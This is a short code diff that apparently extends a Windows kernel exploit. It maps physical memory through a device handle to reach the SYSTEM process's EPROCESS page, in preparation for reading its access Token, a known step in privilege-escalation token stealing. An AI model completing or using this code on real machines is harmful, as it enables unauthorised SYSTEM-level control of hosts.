@@ -68,8 +68,19 @@ int main(int argc, char** argv)
 		EPROCESS_SYSTEM_page_offset.push_back(EPROCESS_SYSTEM[i] & ~((unsigned __int64)-1 & 0xFFF));
 	}
 
-	// print Token for each EPROCESS Base
+	PVOID* buf = (PVOID*)malloc(0x1000);
+	if (buf == 0) {
+		exit(EXIT_FAILURE);
+	}
+
+	// map EPROCESS page
+	if (MapPhysicalMemory((HANDLE) * (PDWORD64)hPhysicalMemory, EPROCESS_SYSTEM_page[0], 0x4000, buf) == FALSE) {
+		fprintf(stderr, "[!] MapPhysicalMemory failed\n");
+		return -1;
+	}
 	
+	// print Token for each EPROCESS Base
+
 
 	CloseHandle((HANDLE)*(PDWORD64)hPhysicalMemory);
 	CloseHandle(device);
